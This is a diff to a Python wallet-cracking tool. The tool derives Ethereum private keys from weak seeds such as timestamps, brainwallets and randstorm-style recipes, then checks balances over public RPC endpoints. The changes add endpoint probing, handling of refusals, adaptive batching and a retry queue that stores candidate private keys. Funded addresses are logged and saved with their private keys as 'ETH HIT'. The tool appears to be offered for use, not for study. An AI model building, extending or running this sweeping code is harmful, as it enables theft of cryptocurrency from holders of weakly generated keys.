@@ -180,17 +180,17 @@ _MS_PER_DAY = 86_400_000
 # every derived candidate is checked live over JSON-RPC. That only works
 # because the requests are BATCHED (ETH_RPC_BATCH calls per HTTP POST).
 # Public MAINNET endpoints; set ETH_RPC_URLS to use your own node.
-# Public, keyless, rate-limited. Chosen from third-party measurements
-# (Oct 2026) of which endpoints still answer without a key: PublicNode, dRPC,
-# 1RPC and Flashbots Protect did; Ankr now needs a key and eth.llamarpc.com
-# returned 525/403. NOTHING here was reachable from the sandbox that shipped
-# this code, so /eth has a "Test RPC" button (POST /api/eth/ping) and
-# ETH_RPC_URLS overrides the whole list — your own node is the only sane choice
-# for a multi-million-candidate sweep.
+# Public, keyless, rate-limited — and all of them reject datacenter traffic at
+# will. 1rpc.io/eth returned HTTP 403 from an EC2 host in ap-south-1 and
+# eth.llamarpc.com 525/403 in Oct 2026 measurements, so neither ships here any
+# more. That is exactly why every job starts with a pre-flight probe
+# (ETH_PREFLIGHT) and why 401/403 parks an endpoint instead of being retried:
+# the only reliable answer for a real sweep is ETH_RPC_URLS pointing at your own
+# node. "Test RPC" on /eth (POST /api/eth/ping) shows what answers from a host.
 ETH_RPC_URLS_DEFAULT = ("https://ethereum-rpc.publicnode.com,"
                         "https://eth.drpc.org,"
-                        "https://1rpc.io/eth,"
-                        "https://rpc.flashbots.net")
+                        "https://rpc.flashbots.net,"
+                        "https://ethereum.blockpi.network/v1/rpc/public")
 _ETH_RPC_BASES = [u.strip().rstrip("/") for u in
                   os.environ.get("ETH_RPC_URLS", ETH_RPC_URLS_DEFAULT).split(",")
                   if u.strip()] or [u.strip().rstrip("/")
@@ -205,6 +205,27 @@ ETH_RPC_TIMEOUT = max(1.0, _env_float("ETH_RPC_TIMEOUT", 25))
 ETH_MIN_WEI     = _env_int("ETH_MIN_WEI", 1, 0)
 ETH_VERIFY_BALANCES = os.environ.get(
     "ETH_VERIFY_BALANCES", "1").strip().lower() not in ("0", "false", "no", "off")
+# Probe every endpoint (eth_blockNumber + a small batch) before deriving
+# anything, and use only the ones that answer. Cheap insurance: a sweep that
+# starts against endpoints which 403 this host wastes hours.
+ETH_PREFLIGHT = os.environ.get(
+    "ETH_PREFLIGHT", "1").strip().lower() not in ("0", "false", "no", "off")
+# A 401/403 is not a rate limit — it means "we will never answer you", so that
+# endpoint is parked for much longer than a throttle. Network/5xx errors get the
+# short park. Both are per endpoint; the Esplora cooldown table is shared.
+ETH_DEAD_COOL_SECS  = max(30.0, _env_float("ETH_DEAD_COOL_SECS", 3600))
+ETH_ERROR_COOL_SECS = max(1.0, _env_float("ETH_ERROR_COOL_SECS", 30))
+# How many full rounds over the usable endpoints one batch request gets before
+# the batch is queued for a later re-check instead of blocking the sweep.
+ETH_RPC_ROUNDS      = _env_int("ETH_RPC_ROUNDS", 3, 1)
+# Candidates whose batch could not be checked are appended to this JSONL file on
+# the data disk (like nonce_retry.txt for the Bitcoin side) instead of being
+# thrown away — deriving one costs up to ~2.7 ms, so a dropped candidate is
+# wasted work. 0 disables the cap.
+ETH_PENDING_FILE    = "eth_pending.jsonl"
+ETH_PENDING_MAX     = _env_int("ETH_PENDING_MAX", 200_000, 0)
+# Some gateways reject an unidentified client with 403. Override if yours does.
+ETH_RPC_USER_AGENT  = os.environ.get("ETH_RPC_USER_AGENT", "").strip()
 # Timestamp-step caps, mirroring RANDSTORM_MAX_MS / RANDSTORM_MAX_TOTAL_MS.
 # One "step" is one timestamp in the selected unit (ms or s).
 ETH_MAX_STEPS       = max(1000, _env_int("ETH_MAX_STEPS", 5_000_000, 1000))
@@ -1787,7 +1808,7 @@ def attack_nonce_reuse_bulk(addresses, log, job):
 _JOBS = {}
 _JOBS_LOCK = threading.Lock()
 JOB_NAMES = ("dataset", "randstorm", "brainwallet", "nonce", "verify",
-             "eth_ts", "eth_weak", "eth_verify")
+             "eth_ts", "eth_weak", "eth_verify", "eth_retry")
 
 _HITS_FILE = None  # set in worker mode: append-only JSONL of hits
 
@@ -3370,79 +3391,242 @@ ETH_PRESETS = [
 _range_chunks = _randstorm_chunks        # generic inclusive chunker
 
 
-# ── JSON-RPC client: batching, pacing, per-endpoint 429 cooldown ─────────
+# ── JSON-RPC client: batching, parking, failover, durable retry queue ────
+# Three failure modes are kept strictly apart, because they need different
+# responses:
+#   throttle (429/5xx)  → park briefly, fail over, wait, retry the SAME batch
+#   refusal  (401/403)  → park for ETH_DEAD_COOL_SECS; if every endpoint
+#                         refuses, stop the run instead of deriving candidates
+#                         that can never be checked
+#   bad batch (400/413, or a single object instead of an array)
+#                       → remember it, halve the batch size, retry as singles
+# Anything that still cannot be checked is appended to eth_pending.jsonl rather
+# than dropped, so the derivation work is not lost.
 _ETH_HEADERS = {"Content-Type": "application/json", "Accept": "application/json"}
-_ETH_BATCH_OK = {}          # base -> bool; some public endpoints refuse batches
+_ETH_BATCH_OK = {}      # base -> bool: accepts a JSON array (batch) request
+_ETH_BASE_ERR = {}      # base -> last failure reason, for aggregated logging
+_ETH_DEAD = {}          # base -> monotonic deadline of a 401/403 refusal
+_ETH_ACTIVE = []        # endpoints that answered the pre-flight probe
+_ETH_LOCK = threading.Lock()
+_ETH_BATCH_SIZE = [ETH_RPC_BATCH]      # adaptive; shrinks when a batch is refused
+_ETH_BATCH_STREAK = [0]
+_ETH_PENDING_N = [-1]                  # cached line count of the queue file
+
+
+class _EthNoEndpoint(RuntimeError):
+    """Every configured endpoint refused us (401/403).
+
+    Deliberately NOT an _EsploraRateLimited: a throttle means "wait and retry",
+    a refusal means "this endpoint will never answer this host", so continuing a
+    multi-hour sweep would only pile up unchecked candidates.
+    """
 
 
 def _eth_headers():
     h = dict(_ETH_HEADERS)
-    h["User-Agent"] = _esplora_headers().get("User-Agent", "btc-hunt")
+    h["User-Agent"] = (ETH_RPC_USER_AGENT
+                       or _esplora_headers().get("User-Agent", "btc-hunt"))
     return h
+
+
+def _eth_host(base):
+    """Host plus path: https://1rpc.io/eth must not display as plain 1rpc.io."""
+    return base.split("//")[-1]
+
+
+def _eth_bases():
+    """Endpoints in play: the pre-flight survivors, or all of them."""
+    return _ETH_ACTIVE or _ETH_RPC_BASES
+
+
+def _eth_park(base, seconds, reason, dead=False):
+    """Cool ONE endpoint down, without raising the global pacing floor."""
+    now = time.monotonic()
+    with _RATE_LOCK:
+        _BASE_COOL[base] = max(_BASE_COOL.get(base, 0.0), now + seconds)
+        _BASE_FAILS[base] = _BASE_FAILS.get(base, 0) + 1
+    with _ETH_LOCK:
+        _ETH_BASE_ERR[base] = reason
+        if dead:
+            _ETH_DEAD[base] = now + seconds
+        else:
+            _ETH_DEAD.pop(base, None)
+
+
+def _eth_unpark(base):
+    with _RATE_LOCK:
+        _BASE_COOL.pop(base, None)
+        _BASE_FAILS.pop(base, None)
+    with _ETH_LOCK:
+        _ETH_BASE_ERR.pop(base, None)
+        _ETH_DEAD.pop(base, None)
+
+
+def _eth_ready():
+    now = time.monotonic()
+    with _RATE_LOCK:
+        cool = dict(_BASE_COOL)
+    return [b for b in _eth_bases() if cool.get(b, 0.0) <= now]
+
+
+def _eth_all_dead():
+    """True when every endpoint in play refused us outright."""
+    now = time.monotonic()
+    bases = _eth_bases()
+    with _ETH_LOCK:
+        dead = {b: t for b, t in _ETH_DEAD.items() if t > now}
+    return bool(bases) and all(b in dead for b in bases)
+
+
+def _eth_status():
+    """One-line per-endpoint state: ok, cooling, or REFUSING (with the reason)."""
+    now = time.monotonic()
+    with _RATE_LOCK:
+        cool = dict(_BASE_COOL)
+    with _ETH_LOCK:
+        dead = dict(_ETH_DEAD)
+        errs = dict(_ETH_BASE_ERR)
+    parts = []
+    for b in _eth_bases():
+        host = _eth_host(b)
+        left = cool.get(b, 0.0) - now
+        if dead.get(b, 0.0) > now:
+            parts.append("%s: REFUSING (%s)" % (host, errs.get(b, "403")))
+        elif left > 0:
+            parts.append("%s: cooling %.0fs" % (host, left))
+        elif b in errs:
+            parts.append("%s: ok (last error: %s)" % (host, errs[b]))
+        else:
+            parts.append("%s: ok" % host)
+    return "  ".join(parts) or "no endpoints configured"
+
+
+def _eth_batch_size():
+    with _ETH_LOCK:
+        return max(1, _ETH_BATCH_SIZE[0])
+
+
+def _eth_shrink_batch():
+    """Halve the batch size after an endpoint refused one. Returns (old, new)."""
+    with _ETH_LOCK:
+        old = _ETH_BATCH_SIZE[0]
+        new = max(1, old // 2)
+        _ETH_BATCH_SIZE[0] = new
+        _ETH_BATCH_STREAK[0] = 0
+        return old, new
+
+
+def _eth_batch_success():
+    """Grow the batch back toward ETH_RPC_BATCH after 20 clean requests."""
+    with _ETH_LOCK:
+        _ETH_BATCH_STREAK[0] += 1
+        if _ETH_BATCH_STREAK[0] >= 20 and _ETH_BATCH_SIZE[0] < ETH_RPC_BATCH:
+            _ETH_BATCH_SIZE[0] = min(ETH_RPC_BATCH,
+                                     max(1, int(_ETH_BATCH_SIZE[0] * 1.5)))
+            _ETH_BATCH_STREAK[0] = 0
+
+
+def _eth_post_once(base, calls, batch, should_stop=None):
+    """One POST to one endpoint. Parks it on failure.
+
+    Returns (kind, data, text) with kind in ok | refused_batch | dead |
+    throttle | reject | error.
+    """
+    _esplora_pace(should_stop)
+    try:
+        r = requests.post(base, json=(calls if batch else calls[0]),
+                          timeout=ETH_RPC_TIMEOUT, headers=_eth_headers())
+    except Exception as e:
+        text = "%s: %s" % (type(e).__name__, str(e)[:100])
+        _eth_park(base, ETH_ERROR_COOL_SECS, text)
+        return "error", None, text
+    body = (r.text or "").strip().replace("\n", " ")[:80]
+    if r.status_code in (401, 403):
+        text = "HTTP %d %s" % (r.status_code, body)
+        _eth_park(base, ETH_DEAD_COOL_SECS, text, dead=True)
+        return "dead", None, text
+    if r.status_code == 429 or r.status_code >= 500:
+        cool = _esplora_throttled(base, r)
+        text = "HTTP %d — cooling %.0fs" % (r.status_code, cool)
+        with _ETH_LOCK:
+            _ETH_BASE_ERR[base] = text
+        return "throttle", None, text
+    if r.status_code >= 400:
+        text = "HTTP %d %s" % (r.status_code, body)
+        _eth_park(base, ETH_ERROR_COOL_SECS, text)
+        return "reject", None, text
+    try:
+        data = r.json()
+    except Exception as e:
+        text = "non-JSON reply (%s)" % str(e)[:60]
+        _eth_park(base, ETH_ERROR_COOL_SECS, text)
+        return "error", None, text
+    if batch and not isinstance(data, list):
+        text = "answered a batch with a single object"
+        _eth_park(base, 0.0, text)
+        return "refused_batch", None, text
+    _esplora_rate_ok(base)
+    with _ETH_LOCK:
+        _ETH_DEAD.pop(base, None)
+        _ETH_BASE_ERR.pop(base, None)
+    return "ok", data, ""
 
 
 def _eth_call_batch(calls, should_stop=None):
     """POST JSON-RPC `calls`; return (results_aligned_with_input, base_used).
 
-    Tries one batch request first. An endpoint that answers a batch with a
-    single object is remembered and gets one request per call instead. 429/5xx
-    parks that endpoint (per-endpoint cooldown, shared with the Esplora client)
-    and fails over to the next one.
+    Every usable endpoint gets one attempt per round, for up to ETH_RPC_ROUNDS
+    rounds. When nothing is left standing the client WAITS for a cooldown to
+    expire and tries again — it does not drop the batch. Only a blanket refusal
+    (_EthNoEndpoint) or exhausted rounds (_EsploraRateLimited) propagate, and
+    the caller queues the batch either way.
     """
     ids = [c["id"] for c in calls]
     batch = len(calls) > 1
-    last_err = None
-    failed_base = None
-    for _attempt in range(ESPLORA_MAX_RETRIES + 1):
+    rounds = max(1, ETH_RPC_ROUNDS)
+    for _round in range(rounds):
         if should_stop and should_stop():
             raise RuntimeError("stopped by user")
-        ready = _esplora_wait_for_base(should_stop, _ETH_RPC_BASES)
-        base = _esplora_pick(ready, failed_base)
-        if batch and not _ETH_BATCH_OK.get(base, True):
-            out = []
-            for c in calls:
-                res, _b = _eth_call_batch([c], should_stop)
-                out.append(res[0])
-            return out, base
-        _esplora_pace(should_stop)
-        try:
-            r = requests.post(base, json=(calls if batch else calls[0]),
-                              timeout=ETH_RPC_TIMEOUT, headers=_eth_headers())
-            if r.status_code == 429 or r.status_code >= 500:
-                cool = _esplora_throttled(base, r)
-                failed_base = base
-                last_err = _EsploraRateLimited(
-                    "HTTP %d from %s — cooling %.0fs"
-                    % (r.status_code, _esplora_host(base), cool))
-                continue
-            r.raise_for_status()
-            data = r.json()
-        except _EsploraRateLimited:
-            raise
-        except RuntimeError as e:
-            if "stopped by user" in str(e):
-                raise
-            failed_base = base
-            last_err = e
+        ready = _eth_ready()
+        if not ready:
+            if _eth_all_dead():
+                raise _EthNoEndpoint(_eth_status())
+            _esplora_wait_for_base(should_stop, _eth_bases())
             continue
-        except Exception as e:
-            failed_base = base
-            last_err = e
-            continue
-        _esplora_rate_ok(base)
-        if batch:
-            if not isinstance(data, list):
-                _ETH_BATCH_OK[base] = False        # refused the batch: retry
-                last_err = RuntimeError("endpoint refused the batch request")
-                continue
-            by_id = {item.get("id"): item for item in data
-                     if isinstance(item, dict)}
-            return [by_id.get(i) for i in ids], base
-        return [data if isinstance(data, dict) else None], base
-    if isinstance(last_err, _EsploraRateLimited):
-        raise last_err
-    raise RuntimeError("Ethereum RPC failed after %d attempt(s): %s"
-                       % (ESPLORA_MAX_RETRIES + 1, last_err))
+        for base in ready:
+            if batch and not _ETH_BATCH_OK.get(base, True):
+                # This endpoint already told us it does not take arrays.
+                out = []
+                for c in calls:
+                    one, _b = _eth_call_batch([c], should_stop)
+                    out.append(one[0])
+                return out, base
+            kind, data, text = _eth_post_once(base, calls, batch, should_stop)
+            if kind == "ok":
+                _eth_batch_success()
+                if batch:
+                    by_id = {item.get("id"): item for item in data
+                             if isinstance(item, dict)}
+                    return [by_id.get(i) for i in ids], base
+                return [data if isinstance(data, dict) else None], base
+            if batch and kind in ("refused_batch", "reject"):
+                # "We do not take arrays" or "that batch is too big": remember
+                # it for this endpoint, halve the size for later batches, and
+                # answer this one with single calls.
+                with _ETH_LOCK:
+                    _ETH_BATCH_OK[base] = False
+                old, new = _eth_shrink_batch()
+                if new < old:
+                    _ETH_BASE_ERR[base] = "%s — batch size %d → %d" % (text, old, new)
+                out = []
+                for c in calls:
+                    res, _b = _eth_call_batch([c], should_stop)
+                    out.append(res[0])
+                return out, base
+        if _eth_all_dead():
+            raise _EthNoEndpoint(_eth_status())
+    raise _EsploraRateLimited("Ethereum RPC unavailable after %d round(s) — %s"
+                              % (rounds, _eth_status()))
 
 
 def _eth_balances(addresses, should_stop=None):
@@ -3494,62 +3678,333 @@ def _eth_verdict(wei, nonce):
     return "empty_or_spent"
 
 
-def _eth_flush(candidates, log, job, should_stop=None, prefix=""):
-    """Live-check one batch of ETH candidates; save the funded ones.
+# ── The retry queue: unchecked candidates are persisted, never dropped ────
+def _eth_pending_path():
+    return DATA_DIR / ETH_PENDING_FILE
 
-    Returns (saved_hits, stopped). A transport failure or 429 stores nothing —
-    a rate limit is not a verdict — and counts the batch as throttled so
-    /results can re-check those addresses later.
+
+def _eth_pending_count():
+    """Lines in the queue file (cached after the first read)."""
+    with _ETH_LOCK:
+        if _ETH_PENDING_N[0] >= 0:
+            return _ETH_PENDING_N[0]
+    n = 0
+    try:
+        with _eth_pending_path().open("r", encoding="utf-8") as f:
+            for _ in f:
+                n += 1
+    except OSError:
+        n = 0
+    with _ETH_LOCK:
+        _ETH_PENDING_N[0] = n
+    return n
+
+
+def _eth_queue_pending(items, job, log=None, reason="", prefix=""):
+    """Append unchecked candidates to eth_pending.jsonl. Returns how many.
+
+    Deriving a candidate costs up to ~2.7 ms (PBKDF2 dominates), so a batch
+    that could not be checked is worth keeping: "Re-check queued candidates"
+    drains this file later without re-deriving anything.
+    """
+    if not items:
+        return 0
+    have = _eth_pending_count()
+    room = len(items) if not ETH_PENDING_MAX else max(0, ETH_PENDING_MAX - have)
+    take = list(items)[:room]
+    dropped = len(items) - len(take)
+    if take:
+        stamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
+        try:
+            with _eth_pending_path().open("a", encoding="utf-8") as f:
+                for c in take:
+                    f.write(json.dumps({
+                        "address": c.get("address"), "privkey": c.get("privkey"),
+                        "recipe": c.get("recipe"),
+                        "attack": c.get("attack", "eth"),
+                        "ts": c.get("ts"), "unit": c.get("unit"),
+                        "queued_at": stamp, "reason": (reason or "")[:120],
+                    }) + "\n")
+            with _ETH_LOCK:
+                _ETH_PENDING_N[0] = have + len(take)
+        except OSError as e:
+            if log:
+                log("%s[eth] could not write %s: %s"
+                    % (prefix, _eth_pending_path(), e))
+            job["eth_dropped"] = job.get("eth_dropped", 0) + len(items)
+            return 0
+    job["eth_queued"] = job.get("eth_queued", 0) + len(take)
+    if dropped:
+        job["eth_dropped"] = job.get("eth_dropped", 0) + dropped
+        if log and not job.get("_eth_drop_warned"):
+            job["_eth_drop_warned"] = True
+            log("%s[!] retry queue full (ETH_PENDING_MAX=%s) — %s candidate(s) "
+                "dropped" % (prefix, format(ETH_PENDING_MAX, ","),
+                             format(dropped, ",")))
+    return len(take)
+
+
+def _eth_pending_read(limit=None):
+    out = []
+    try:
+        with _eth_pending_path().open("r", encoding="utf-8") as f:
+            for line in f:
+                line = line.strip()
+                if not line:
+                    continue
+                try:
+                    row = json.loads(line)
+                except Exception:
+                    continue
+                if isinstance(row, dict) and row.get("address"):
+                    out.append(row)
+                    if limit and len(out) >= limit:
+                        break
+    except OSError:
+        return []
+    return out
+
+
+def _eth_pending_write(items):
+    """Atomic replace of the queue with whatever is still unchecked."""
+    path = _eth_pending_path()
+    tmp = path.with_name(path.name + ".part")
+    try:
+        with tmp.open("w", encoding="utf-8") as f:
+            for row in items:
+                f.write(json.dumps(row) + "\n")
+        os.replace(tmp, path)
+    except OSError:
+        try:
+            tmp.unlink()
+        except OSError:
+            pass
+        raise
+    with _ETH_LOCK:
+        _ETH_PENDING_N[0] = len(items)
+
+
+def _eth_record(c, v, log, job, prefix=""):
+    """Store one balance check; save the hit if it clears ETH_MIN_WEI.
+
+    Returns ("hit" | "skipped" | "error", payload_or_None). Shared by the sweep
+    jobs and the queue drainer so both save hits identically.
+    """
+    now = datetime.now(timezone.utc).isoformat(timespec="seconds")
+    err = (v or {}).get("error") or ""
+    if err:
+        _store_eth_check(c["address"], 0, 0, err)
+        hit = {**c, "balance_wei": None, "balance_nonce": 0,
+               "balance_checked_at": now, "balance_error": err,
+               "balance_verdict": "check_failed"}
+        _save_result(c.get("attack", "eth"), hit)
+        log("%s[!] %s: balance check failed (%s) — saved as candidate"
+            % (prefix, c["address"], err))
+        return "error", hit
+    wei, nonce = v["wei"], v["nonce"]
+    _store_eth_check(c["address"], wei, nonce)
+    hit = {**c, "balance_wei": str(wei), "balance_eth": wei / 1e18,
+           "balance_nonce": nonce, "balance_checked_at": now,
+           "balance_error": "", "balance_verdict": _eth_verdict(wei, nonce)}
+    if wei >= max(ETH_MIN_WEI, 1):
+        _save_result(c.get("attack", "eth"), hit)
+        log("%s  ★★★ ETH HIT %s  %.6f ETH  nonce=%d  privkey=%s  %s"
+            % (prefix, hit["address"], wei / 1e18, nonce,
+               hit.get("privkey", ""), hit.get("recipe", "")))
+        return "hit", hit
+    job["eth_skipped"] = job.get("eth_skipped", 0) + 1
+    return "skipped", None
+
+
+def _eth_flush(candidates, log, job, should_stop=None, prefix=""):
+    """Live-check candidates in adaptive batches; save the funded ones.
+
+    Returns (saved_hits, stopped). Nothing is silently discarded: a batch that
+    cannot be checked goes to eth_pending.jsonl, and a Stop queues whatever is
+    still in the buffer.
     """
     if not candidates:
         return [], False
     if not ETH_VERIFY_BALANCES:
         job["eth_unchecked"] = job.get("eth_unchecked", 0) + len(candidates)
         return [], False
-    addrs = [c["address"] for c in candidates]
-    try:
-        balances = _eth_balances(addrs, should_stop)
-    except RuntimeError as e:
-        if "stopped by user" in str(e):
-            log(prefix + "[eth] stopped by user")
-            return [], True
-        job["throttled"] = job.get("throttled", 0) + len(addrs)
-        log("%s[!] %d candidate(s) left unchecked: %s"
-            % (prefix, len(addrs), e))
-        return [], False
-    saved, skipped = [], 0
-    for c in candidates:
-        v = balances.get(c["address"]) or {"wei": 0, "nonce": 0,
-                                           "error": "no result"}
-        err = v.get("error") or ""
-        now = datetime.now(timezone.utc).isoformat(timespec="seconds")
-        if err:
-            _store_eth_check(c["address"], 0, 0, err)
-            hit = {**c, "balance_wei": None, "balance_nonce": 0,
-                   "balance_checked_at": now, "balance_error": err,
-                   "balance_verdict": "check_failed"}
-            saved.append(hit)
-            _save_result(c.get("attack", "eth"), hit)
-            log("%s[!] %s: balance check failed (%s) — saved as candidate"
-                % (prefix, c["address"], err))
+    saved = []
+    i = 0
+    while i < len(candidates):
+        if should_stop and should_stop():
+            n = _eth_queue_pending(candidates[i:], job, log,
+                                   "stopped before checking", prefix)
+            if n:
+                log("%s[eth] stopped — %s unchecked candidate(s) queued in %s"
+                    % (prefix, format(n, ","), _eth_pending_path()))
+            return saved, True
+        chunk = candidates[i:i + _eth_batch_size()]
+        i += len(chunk)
+        addrs = [c["address"] for c in chunk]
+        try:
+            balances = _eth_balances(addrs, should_stop)
+        except RuntimeError as e:
+            msg = str(e)
+            if "stopped by user" in msg:
+                n = _eth_queue_pending(candidates[i - len(chunk):], job, log,
+                                       "stopped by user", prefix)
+                log("%s[eth] stopped by user (%s candidate(s) queued)"
+                    % (prefix, format(n, ",")))
+                return saved, True
+            if isinstance(e, _EthNoEndpoint):
+                n = _eth_queue_pending(candidates[i - len(chunk):], job, log,
+                                       msg, prefix)
+                job["eth_no_rpc"] = True
+                log("%s[eth] EVERY configured endpoint refused us: %s"
+                    % (prefix, msg))
+                log("%s[eth] %s candidate(s) queued in %s and this run is "
+                    "stopping — deriving more would only grow the queue. Set "
+                    "ETH_RPC_URLS to an endpoint that answers this host (your "
+                    "own node is the reliable option), then press 'Re-check "
+                    "queued candidates'." % (prefix, format(n, ","),
+                                             _eth_pending_path()))
+                job["detail"] = ("stopped: no RPC endpoint answered — %s queued"
+                                 % format(n, ","))
+                return saved, True
+            job["throttled"] = job.get("throttled", 0) + len(addrs)
+            n = _eth_queue_pending(chunk, job, log, msg, prefix)
+            log("%s[!] %s candidate(s) unchecked, %s queued for re-check: %s"
+                % (prefix, format(len(addrs), ","), format(n, ","), msg))
             continue
-        wei, nonce = v["wei"], v["nonce"]
-        _store_eth_check(c["address"], wei, nonce)
-        verdict = _eth_verdict(wei, nonce)
-        hit = {**c, "balance_wei": str(wei), "balance_eth": wei / 1e18,
-               "balance_nonce": nonce, "balance_checked_at": now,
-               "balance_error": "", "balance_verdict": verdict}
-        if wei >= max(ETH_MIN_WEI, 1):
-            saved.append(hit)
-            _save_result(c.get("attack", "eth"), hit)
-            log("%s  ★★★ ETH HIT %s  %.6f ETH  nonce=%d  privkey=%s  %s"
-                % (prefix, hit["address"], wei / 1e18, nonce,
-                   hit.get("privkey", ""), hit.get("recipe", "")))
-        else:
-            skipped += 1
-    if skipped:
-        job["eth_skipped"] = job.get("eth_skipped", 0) + skipped
+        for c in chunk:
+            v = balances.get(c["address"]) or {"wei": 0, "nonce": 0,
+                                               "error": "no result"}
+            _kind, hit = _eth_record(c, v, log, job, prefix)
+            if hit is not None:
+                saved.append(hit)
     return saved, False
+
+
+def _eth_preflight(log, job=None, prefix=""):
+    """Probe every configured endpoint before deriving anything.
+
+    One parallel round of eth_blockNumber plus a small batch probe says which
+    endpoints are usable from THIS host — starting a multi-hour sweep against
+    endpoints that answer 403 is the expensive mistake this avoids. Returns the
+    usable bases (empty means "do not start").
+    """
+    global _ETH_ACTIVE
+    if not ETH_VERIFY_BALANCES or not ETH_PREFLIGHT:
+        with _ETH_LOCK:
+            _ETH_ACTIVE = []
+        return list(_ETH_RPC_BASES)
+    t0 = time.monotonic()
+    with ThreadPoolExecutor(max_workers=min(4, max(1, len(_ETH_RPC_BASES)))) as ex:
+        infos = list(ex.map(_eth_ping_base, _ETH_RPC_BASES))
+    alive = []
+    for info in infos:
+        if info["ok"]:
+            alive.append(info["url"])
+            _eth_unpark(info["url"])
+            log("%s[eth] RPC %s: block %s, %d ms, batch %s"
+                % (prefix, info["host"], format(info["block"] or 0, ","),
+                   info["ms"], "yes" if info["batch"] else "NO — single calls"))
+        else:
+            err = info["error"] or "no reply"
+            dead = ("403" in err) or ("401" in err) or ("Forbidden" in err)
+            _eth_park(info["url"],
+                      ETH_DEAD_COOL_SECS if dead else ETH_ERROR_COOL_SECS,
+                      err, dead=dead)
+            log("%s[eth] RPC %s: UNUSABLE — %s%s"
+                % (prefix, info["host"], err,
+                   " (refusing this host; parked %.0fs)" % ETH_DEAD_COOL_SECS
+                   if dead else ""))
+    with _ETH_LOCK:
+        _ETH_ACTIVE = alive
+    if job is not None:
+        job["eth_rpc_alive"] = len(alive)
+    if alive:
+        log("%s[eth] %d/%d endpoint(s) usable in %.1fs — batches of %d "
+            "address(es) (%d calls)"
+            % (prefix, len(alive), len(infos), time.monotonic() - t0,
+               _eth_batch_size(), _eth_batch_size() * 2))
+    else:
+        log("%s[eth] NO endpoint answered. Set ETH_RPC_URLS to your own node or "
+            "a provider that accepts this host — nothing can be checked until "
+            "then. (ETH_PREFLIGHT=0 skips this probe.)" % prefix)
+    return alive
+
+
+def retry_eth_pending(log, job):
+    """Drain eth_pending.jsonl: re-check queued candidates, save the hits.
+
+    The queue holds whole candidates (address, privkey, recipe, timestamp), so a
+    re-check needs no re-derivation and a funded address is saved with the same
+    payload a live sweep would have produced.
+    """
+    items = _eth_pending_read()
+    path = _eth_pending_path()
+    if not items:
+        log("[eth-retry] nothing queued (%s is empty)" % path)
+        job["detail"] = "queue empty"
+        job["progress"] = 1.0
+        return []
+    total = len(items)
+    log("[eth-retry] %s queued candidate(s) from %s"
+        % (format(total, ","), path))
+    if not _eth_preflight(log, job):
+        job["detail"] = "no RPC endpoint answered — queue untouched"
+        return []
+    saved, remaining = [], []
+    checked = 0
+    t0 = time.time()
+    i = 0
+    stopped = False
+    while i < total:
+        if job["stop"]:
+            log("[eth-retry] stopped by user — the rest stays queued")
+            remaining += items[i:]
+            stopped = True
+            break
+        chunk = items[i:i + _eth_batch_size()]
+        i += len(chunk)
+        addrs = [c["address"] for c in chunk]
+        try:
+            balances = _eth_balances(addrs, lambda: job["stop"])
+        except RuntimeError as e:
+            if isinstance(e, _EthNoEndpoint):
+                log("[eth-retry] every endpoint refused us: %s" % e)
+                remaining += items[i - len(chunk):]
+                stopped = True
+                break
+            remaining += chunk
+            log("[eth-retry] %s candidate(s) stay queued: %s"
+                % (format(len(chunk), ","), e))
+            continue
+        for c in chunk:
+            v = balances.get(c["address"]) or {"wei": 0, "nonce": 0,
+                                               "error": "no result"}
+            checked += 1
+            _kind, hit = _eth_record(c, v, log, job)
+            if hit is not None:
+                saved.append(hit)
+        rate = checked / max(time.time() - t0, 0.001)
+        job["progress"] = min(1.0, i / total)
+        job["throttled"] = len(remaining)
+        job["detail"] = ("%s/%s queued  hits=%d  empty=%s  re-queued=%s  "
+                         "%.1f addr/s  eta ~%.1f min"
+                         % (format(i, ","), format(total, ","), len(saved),
+                            format(job.get("eth_skipped", 0), ","),
+                            format(len(remaining), ","), rate,
+                            (total - i) / max(rate, 0.001) / 60))
+    try:
+        _eth_pending_write(remaining)
+    except OSError as e:
+        log("[eth-retry] could not rewrite %s: %s — the queue is unchanged"
+            % (path, e))
+        remaining = items
+    if not stopped:
+        job["progress"] = 1.0
+    job["throttled"] = len(remaining)
+    log("[eth-retry] done — %d hit(s) saved, %s empty skipped, %s still queued "
+        "in %s" % (len(saved), format(job.get("eth_skipped", 0), ","),
+                   format(len(remaining), ","), path))
+    return saved
 
 
 def _eth_candidate(rid, priv, extra, attack, ts=None, unit=None):
@@ -3587,10 +4042,11 @@ def attack_eth_timestamp(start, end, unit, recipe_ids, log, job):
            format(ETH_MAX_STEPS, ","), ", ".join(ids), EC_BACKEND,
            ETH_HASH_BACKEND))
     if ETH_VERIFY_BALANCES:
-        log("[eth] balances come from %d RPC endpoint(s) in batches of %d "
-            "addresses (%d calls): %s"
-            % (len(_ETH_RPC_BASES), ETH_RPC_BATCH, ETH_RPC_BATCH * 2,
-               _esplora_status(_ETH_RPC_BASES)))
+        log("[eth] endpoints before probing: %s" % _eth_status())
+        if not _eth_preflight(log, job):
+            job["detail"] = ("no RPC endpoint answered — nothing derived; set "
+                             "ETH_RPC_URLS")
+            return []
     else:
         log("[eth] ETH_VERIFY_BALANCES=0 — candidates are NOT checked and NOT "
             "saved; they are only counted as unchecked")
@@ -3628,7 +4084,7 @@ def attack_eth_timestamp(start, end, unit, recipe_ids, log, job):
                         job["_eth_recipe_err"] = True
                         log("[eth] recipe %s failed: %s" % (rid, e))
             ts_done += 1
-            if len(pending) >= ETH_RPC_BATCH:
+            if len(pending) >= _eth_batch_size():
                 batch, pending = pending, []
                 seen_batch.clear()
                 saved, stopped = _eth_flush(batch, log, job,
@@ -3642,23 +4098,30 @@ def attack_eth_timestamp(start, end, unit, recipe_ids, log, job):
                 left = total - (base_done + i + 1)
                 job["progress"] = min(1.0, (base_done + i + 1) / total)
                 job["detail"] = ("%s/%s ts  chunk %d/%d  %.0f ts/s  %d "
-                                 "recipe(s)  hits=%d  unchecked=%s  "
-                                 "throttled=%s  eta ~%.1f min"
+                                 "recipe(s)  hits=%d  queued=%s  throttled=%s  "
+                                 "batch=%d  eta ~%.1f min"
                                  % (format(base_done + i + 1, ","),
                                     format(total, ","), chunk_no, chunk_count,
                                     rate, len(ids), len(hits),
-                                    format(job.get("eth_unchecked", 0), ","),
+                                    format(job.get("eth_queued", 0), ","),
                                     format(job.get("throttled", 0), ","),
+                                    _eth_batch_size(),
                                     left / max(rate, 0.001) / 60))
         base_done += ce - cs + 1
         if stopped:
             break
-    if pending and not stopped:
-        saved, stopped = _eth_flush(pending, log, job, lambda: job["stop"])
-        hits += saved
